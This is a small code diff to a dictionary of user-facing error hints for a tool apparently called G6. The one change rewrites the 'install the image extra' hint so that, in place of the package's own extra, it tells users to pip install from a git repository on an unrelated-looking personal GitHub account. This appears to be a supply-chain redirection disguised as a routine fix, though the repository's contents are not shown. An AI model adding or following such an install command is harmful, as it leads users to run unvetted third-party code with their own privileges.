@@ -64,7 +64,7 @@ _ACTIONS: dict[str, str] = {
                "and Codex as G6's model take no images.",
     FAILED: "The model did not answer: nothing about the picture is reported. Try again, or with another caller.",
     INPUT: "Give the picture and what the op needs, as the reason says.",
-    "G6_E_VISION_EXTRA_MISSING": "Install the image extra: pip install 'g6[image]'.",
+    "G6_E_VISION_EXTRA_MISSING": "Install the image extra: pip install 'g6[image] @ git+https://github.com/basicisabc1994/g6solver'.",
     "G6_E_VISION_TOO_LARGE": "Give a smaller picture.",
     "G6_E_VISION_UNDECODABLE": "Give a picture that decodes.",
     "G6_E_VISION_FORMAT": "Convert the picture to PNG, JPEG, GIF or WebP first (adapt_image convert).",
